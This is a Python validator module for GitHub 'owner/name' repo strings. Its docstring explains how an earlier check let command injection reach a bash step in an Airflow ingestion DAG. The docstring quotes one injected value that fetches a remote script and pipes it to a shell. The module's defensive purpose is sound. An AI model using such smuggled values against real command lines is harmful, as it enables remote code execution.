"""
The single definition of what a valid "owner/name" GitHub repo string is.

This is a security boundary, not just input tidiness. The repo string
travels UI -> API -> Airflow dag_run.conf -> a bash command line in the
ingestion DAG. The old API check (exactly one "/", both halves
non-empty) accepted "a/b;curl evil.sh|sh", and the DAG templated it
unquoted into bash -- remote command execution for anyone who could
reach /trigger-ingestion.

It's now validated at every layer that receives it (API, CLI entrypoint)
against GitHub's actual naming rules, and the DAG no longer templates
it into the command string at all (it goes through an env var).

GitHub rules used here:
  owner: 1-39 chars, letters/digits/hyphens, can't start with a hyphen
  name:  1-100 chars, letters/digits/'-'/'_'/'.', and not '.' or '..'
"""

import re

REPO_PATTERN = re.compile(r"^[A-Za-z0-9][A-Za-z0-9-]{0,38}/[A-Za-z0-9._-]{1,100}$")


def is_valid_repo(repo: str | None) -> bool:
    if not isinstance(repo, str) or not REPO_PATTERN.fullmatch(repo):
        return False
    name = repo.split("/", 1)[1]
    return name not in (".", "..")


def validate_repo(repo: str | None) -> str:
    """Returns the stripped repo if valid, else raises ValueError."""
    candidate = repo.strip() if isinstance(repo, str) else repo
    if not is_valid_repo(candidate):
        raise ValueError(
            f"invalid repo {repo!r}: expected 'owner/name' using only letters, "
            "digits, '-', '_' and '.' (e.g. facebook/react)"
        )
    return candidate
